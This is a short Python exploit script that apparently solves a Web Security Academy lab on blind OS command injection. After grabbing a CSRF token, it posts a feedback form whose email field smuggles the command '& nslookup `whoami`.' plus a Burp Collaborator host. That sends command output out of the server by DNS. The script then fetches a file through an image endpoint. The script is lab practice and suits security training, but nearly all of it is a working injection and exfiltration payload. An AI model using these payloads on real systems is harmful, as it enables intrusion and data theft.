import requests
import bs4
from bs4 import BeautifulSoup
import os
from urllib.parse import urljoin


base = 'https://ac891fc91feb4fa8c06f2fbc007f0064.web-security-academy.net/'
collaborator_host = 'r3v88nl4tsx32cmszua4xvagh7nxbm.burpcollaborator.net'

get_response = requests.get(urljoin(base, 'feedback'))
html = get_response.content.decode('utf-8')
soup = BeautifulSoup(html, 'html5lib')
csrf_input = soup.find('input', {'name': 'csrf'})
csrf_token = csrf_input['value']

print(csrf_token)
data = {
  'csrf': csrf_token,
  'name': ';',
  'email': f'& nslookup `whoami`.{collaborator_host} &',
  'subject': 'echo',
  'message': 'bla'
}

response = requests.post(urljoin(base, '/feedback/submit'), data=data, cookies=get_response.cookies)
print(response.content.decode('utf-8'))

response = requests.get(urljoin(base, 'image?filename=whoami.txt'), data=data)
print(response.content.decode('utf-8'))
